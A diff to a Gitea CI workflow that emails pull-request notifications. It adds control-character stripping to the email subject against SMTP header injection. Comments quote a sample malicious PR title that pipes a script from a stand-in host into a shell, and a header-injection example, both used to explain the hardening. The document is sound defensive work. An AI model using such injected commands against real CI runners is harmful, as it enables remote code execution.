@@ -17,7 +17,10 @@ name: PR Notification
 # `${{ }}` — a PR titled `"; curl evil.sh | sh; #` would otherwise execute on the
 # runner. They are then HTML-escaped with jq's `@html` before going into the card,
 # so a title containing markup renders as text instead of live HTML in the reader's
-# mail client. (This escaping is the one deviation from the homelab original.)
+# mail client, and the Subject gets control characters stripped so a CR/LF in a title
+# can't turn into an injected SMTP header. Those two sanitizing steps are the only
+# deviations from the homelab original; for an ordinary title both are no-ops and the
+# rendered card is byte-for-byte identical to homelab's.
 #
 # Not a required status check — branch protection ticks contexts explicitly, and a
 # notifier must never be able to block a merge. See docs/ci-branch-protection.md.
@@ -58,6 +61,16 @@ jobs:
           e_base=$(esc "$BASE_BRANCH")
           e_url=$(esc "$PR_URL")
 
+          # The Subject is plain text, not HTML, so it takes the raw title — but
+          # strip control characters first. A title carrying CR/LF would otherwise be
+          # a header-injection attempt ("...\nBcc: victim@") the moment anything
+          # writes it into an SMTP `Subject:` header verbatim. The relay happens to
+          # B-encode the subject today (mime.BEncoding.Encode in homelab-gitops
+          # services/mail-relay/main.go, which encodes on any byte < 0x20), so this is
+          # belt-and-braces — but that is a downstream detail in ANOTHER repo, and
+          # this workflow should not be one refactor away from being injectable.
+          subject_title=$(printf '%s' "$PR_TITLE" | tr -d '\000-\037')
+
           style='body{margin:0;padding:24px 16px;background:#f1f5f9;font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,sans-serif;}.card{max-width:600px;margin:0 auto;background:#fff;border-radius:10px;overflow:hidden;box-shadow:0 2px 8px rgba(0,0,0,.08);}.hdr{padding:26px 30px;background:#3b82f6;color:#fff;}.badge{display:inline-block;font-size:13px;font-weight:700;letter-spacing:.08em;text-transform:uppercase;background:rgba(255,255,255,.2);border-radius:5px;padding:3px 11px;margin-bottom:12px;}.title{font-size:26px;font-weight:700;line-height:1.2;margin-bottom:6px;}.sub{font-size:15px;opacity:.85;}.body{padding:26px 30px;}.sec{font-size:12px;font-weight:700;letter-spacing:.08em;text-transform:uppercase;color:#94a3b8;margin-bottom:10px;padding-bottom:5px;border-bottom:1px solid #f1f5f9;}.tbl{width:100%;border-collapse:collapse;font-size:14px;margin-bottom:24px;}.tbl td{padding:7px 10px;vertical-align:top;border-bottom:1px solid #f8fafc;}.tbl td.k{color:#64748b;white-space:nowrap;}.tbl td.v{color:#1e293b;word-break:break-all;}.tbl tr:last-child td{border-bottom:none;}.btn{display:inline-block;padding:12px 26px;background:#3b82f6;color:#fff;text-decoration:none;border-radius:6px;font-size:15px;font-weight:600;}.footer{padding:14px 30px;background:#f8fafc;border-top:1px solid #e2e8f0;font-size:13px;color:#94a3b8;text-align:center;}'
 
           html='<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><style>'"${style}"'</style></head><body>'
@@ -73,7 +86,7 @@ jobs:
           html+='</div><div class="footer">🔔 Sent by Gitea CI</div></div></body></html>'
 
           # Send via the mail-relay (retry + spool); From=ci is allowlisted.
-          jq -nc --arg s "🔀 PR #${PR_NUMBER}: ${PR_TITLE}" --arg h "$html" \
+          jq -nc --arg s "🔀 PR #${PR_NUMBER}: ${subject_title}" --arg h "$html" \
             '{from:"ci", name:"CI", subject:$s, html:$h}' \
           | curl -sf -X POST "${MAIL_RELAY:-http://mail-relay.mail.svc.cluster.local/send}" \
               -H 'Content-Type: application/json' --data-binary @- \
